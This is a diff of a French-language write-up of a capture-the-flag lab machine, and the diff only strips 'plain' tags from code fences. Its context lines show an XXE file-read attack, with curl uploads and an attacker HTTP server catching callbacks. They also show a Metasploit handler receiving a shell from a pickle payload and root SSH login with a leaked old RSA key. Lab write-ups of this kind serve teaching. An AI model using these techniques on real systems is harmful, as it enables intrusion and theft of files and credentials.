@@ -63,7 +63,7 @@ Le XML est l'exemple type :
 
 L'envoi peut se faire via cURL :  
 
-```plain
+```
 $ curl -D- -X POST http://10.10.10.91:5000/upload --form "file=@test.xml"
 HTTP/1.1 500 Internal Server Error
 Connection: close
@@ -83,7 +83,7 @@ Content-Length: 141
 
 Malgré l'erreur 500 ça toque bien à la porte :)   
 
-```plain
+```
 $ sudo python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.10.10.91 - - [06/Sep/2018 14:23:09] code 404, message File not found
@@ -101,7 +101,7 @@ On se rend assez vite compte que si on envoie du XML dégueulasse l'erreur 500 n
 
 Quand on parvient finalement à générer un XML valide on remarque qu'en plus du message de réussite de l'upload on a un nom d’utilisateur Unix mentionné :  
 
-```plain
+```
 URL for later reference: /uploads/foo.xml
 File path: /home/roosa/deploy/src
 ```
@@ -158,7 +158,7 @@ La difficulté d'exploitation des failles XXE réside dans le fait qu'il faille 
 
 Ici le code se charge des deux premiers problèmes, pour le reste on peut laisser un *http.server* tourner en background.  
 
-```plain
+```
 $ python3 get_file.py /home/roosa/user.txt
 c5808e1643e801d40f09ed87cdecc67b
 ```
@@ -220,7 +220,7 @@ Et on passe ça à [evilPick](https://github.com/francescolacerenza/evilPick) qu
 
 Pour l'envoi du payload, au choix avec cURL / requests / whatever...  
 
-```plain
+```
 msf exploit(multi/handler) > exploit -j
 [*] Exploit running as background job 1.
 
@@ -253,7 +253,7 @@ Commit leak
 
 Via un listing récursif je note tout ce qui peut être d'intérêt dans le dossier personnel :  
 
-```plain
+```
 ./.config/libaccounts-glib:
 total 20
 drwxr-xr-x  2 roosa roosa  4096 Mar 21 07:09 .
@@ -292,7 +292,7 @@ Et on peut voir la présence d'une ancienne clé privée RSA via diff :
 
 Cette fois c'est la bonne :  
 
-```plain
+```
 devloop@kali:~/Documents/devoops$ ssh -i old_rsa.key root@10.10.10.91
 Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-37-generic i686)
 
